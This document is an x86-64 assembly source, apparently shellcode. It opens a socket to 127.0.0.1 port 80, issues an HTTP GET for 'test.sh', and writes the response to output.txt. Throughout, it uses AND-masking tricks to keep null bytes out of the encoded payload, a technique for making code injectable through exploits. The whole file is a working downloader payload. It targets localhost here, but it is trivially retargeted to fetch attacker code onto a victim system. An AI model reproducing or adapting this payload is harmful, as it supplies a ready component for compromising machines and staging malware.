BITS 64

SECTION .text
global _start

_start:

xor rax,rax

; SOCKET CALL
; -----------
mov dil,0x2
mov sil,0x1
mov dl,0x6
mov al,0x29
syscall
mov rdi,rax

; CONNECT CALL
; ------------
mov al,42
xor rdx,rdx
push rdx
; 127.0.0.1
mov rdx,0x0101017f
and rdx,0x111010ff ; AVOID NULL BYTE
push rdx
; port 80
mov r8w,0x5001
and r8w,0xff10 ; AVOID NULL BYTE
push r8w
push word 0x02
mov rsi,rsp
xor edx,edx
mov dl,0x10
syscall

; WRITE TO SOCKET
; ---------------
xor rax,rax
mov al,0x1
jmp short http_request
socket_write:
pop rsi
mov dl,43
syscall

; READ RESPONSE
; -------------
xor rax,rax
xor r8,r8
mov r8, 0x01011111
and r8,0x10101111
sub rsp, r8
mov rsi,rsp
mov rdx,r8
syscall
mov r8,rsi

; STORE LENGTH OF RESPONSE
; ------------------------
mov r10w,ax

; OPEN FILE
; ---------
jmp short open_file_name
open_file:
pop rdi
xor rsi,rsi
xor rdx,rdx
mov sil, 0x42     ;O_CREAT, man open
mov dx, 0x1b6     ;umode_t
xor rax,rax
mov al, 2
syscall

; WRITE TO FILE
; -------------
mov rdi,rax
mov dx, r10w
mov rsi, r8
xor rax,rax
mov al,1
syscall

; EXIT(0)
; -------
xor rdi,rdi
xor rax,rax
mov al,60
syscall

http_request:
call socket_write
request: db 'GET /test.sh HTTP/1.1',0x0d,0x0a,'Host: 127.0.0.1',0x0d,0x0a,0x0d,0x0a,0

open_file_name:
call open_file
filename: db 'output.txt',0
